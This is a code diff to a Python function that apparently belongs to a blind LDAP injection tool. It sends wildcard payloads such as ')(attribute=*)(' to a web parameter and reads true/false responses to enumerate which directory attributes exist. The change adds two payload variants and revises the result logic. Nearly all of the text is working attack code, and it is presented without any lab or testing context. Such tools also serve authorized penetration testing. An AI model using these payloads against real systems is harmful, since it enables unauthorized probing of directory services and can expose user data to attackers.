@@ -408,7 +408,10 @@ def discover_attributes(
     """
     Iterate through *attributes* and test each with a wildcard payload.
 
-    The payload format is: )(attribute=*)
+    The payload formats are:
+      - )(attribute=*)(
+      - )(attribute=*)(attribute=
+      - )(attribute=*)
     A "true" response implies that attribute exists on the LDAP entry.
 
     When *attributes* is ``None`` the built-in ``COMMON_ATTRIBUTES`` list is
@@ -423,23 +426,34 @@ def discover_attributes(
     found: list[str] = []
 
     for attr in attributes:
-        payload = f")({attr}=*)"
-        data = build_payload_data(base_data, param, payload, use_json)
-        resp = send_request(session, url, data, verbose, use_json)
-        if resp is None:
-            continue
+        payload_variants = (
+            f")({attr}=*)(",
+            f")({attr}=*)({attr}=",
+            f")({attr}=*)",
+        )
         status_true_set = true_statuses if true_statuses is not None else {true_status}
-        classification = classify_response(resp, status_true_set, true_length, false_statuses)
-        if classification == "true":
-            print(f"  [+] Attribute present: {attr}")
-            found.append(attr)
-        elif classification == "false":
-            print(f"  [-] Attribute absent:  {attr}")
-        else:
+        attr_found = False
+        saw_false = False
+        for payload in payload_variants:
+            data = build_payload_data(base_data, param, payload, use_json)
+            resp = send_request(session, url, data, verbose, use_json)
+            if resp is None:
+                continue
+            classification = classify_response(resp, status_true_set, true_length, false_statuses)
+            if classification == "true":
+                print(f"  [+] Attribute present: {attr}")
+                found.append(attr)
+                attr_found = True
+                break
+            if classification == "false":
+                saw_false = True
+                continue
             print(
                 f"  [!] Attribute {attr}: unexpected HTTP {resp.status_code} (classified as ERROR)",
                 file=sys.stderr,
             )
+        if not attr_found and saw_false:
+            print(f"  [-] Attribute absent:  {attr}")
 
     return found
 
